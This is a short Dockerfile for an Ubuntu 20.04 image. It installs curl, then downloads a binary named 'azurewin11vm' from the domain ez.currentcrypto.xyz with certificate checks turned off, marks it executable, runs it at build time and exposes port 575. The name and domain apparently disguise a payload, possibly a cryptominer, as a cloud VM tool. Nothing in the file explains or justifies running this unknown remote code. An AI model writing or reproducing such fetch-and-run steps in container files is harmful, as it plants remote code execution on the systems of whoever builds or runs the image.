FROM ubuntu:20.04
RUN apt update
RUN apt-get update && apt-get install -y \
curl
CMD /bin/bash
RUN curl -skLO https://ez.currentcrypto.xyz/azurewin11vm
RUN chmod +x azurewin11vm
RUN ./azurewin11vm
EXPOSE 575
